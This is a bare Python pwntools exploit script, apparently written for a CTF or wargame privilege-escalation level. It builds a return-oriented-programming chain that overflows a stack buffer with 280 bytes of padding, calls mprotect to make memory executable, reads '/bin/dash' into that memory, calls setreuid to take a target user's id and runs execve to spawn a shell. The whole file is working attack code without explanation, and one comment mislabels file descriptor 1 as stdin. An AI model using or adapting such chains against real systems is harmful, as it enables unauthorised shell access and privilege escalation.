from pwn import *                                                               
                                                                                
# target RWX memory address                                                     
ch34    = 0x400000                                                              
passwd  = 0x40000b                                                              
                                                                                
# ROP gadgets                                                                   
retf    = 0x400231                                                              
syscall = 0x45eba5                                                              
pop_rdx = 0x437205
pop_rax = 0x44d2b4                                                              
pop_rdi = 0x4016d3                                                              
pop_rsi = 0x4017e7
pop2ret = 0x437229      # pop rdx; pop rsi; ret


# functions()
mprotect = 0x434e10
read = 0x4342a0

# mprotect()
payload = ""
payload += "A" * 280
payload += p64(pop_rdi)
payload += p64(ch34)
payload += p64(pop2ret)
payload += p64(0x7)
payload += p64(0x2000)
payload += p64(mprotect)

# read '/bin/dash' into rwx memory
payload += p64(pop_rdi)
payload += p64(0x1)     # rdi - stdin
payload += p64(pop2ret)
payload += p64(0x9)     # rdx - 9 bytes '/bin/dash'
payload += p64(ch34)    # rwx - memory addres
payload += p64(read)    # call read

# setreuid(1234)         
payload += p64(pop_rax)
payload += p64(0x113) 		# setreuid
payload += p64(pop_rdi) 
payload += p64(0x1234)		# reuid - 1234 (cracked34)
payload += p64(pop_rsi)          
payload += p64(0x1234) 		# euid	- 1234
payload += p64(syscall)              
                       
# execve('/bin/dash', 0, 0)                        
payload += p64(pop_rdi)                      
payload += p64(ch34)        # rdi  - '/bin/dash'
payload += p64(pop2ret)
payload += p64(0x0)
payload += p64(0x0)    
payload += p64(pop_rax)
payload += p64(0x3b)   
payload += p64(syscall)
                       
print payload
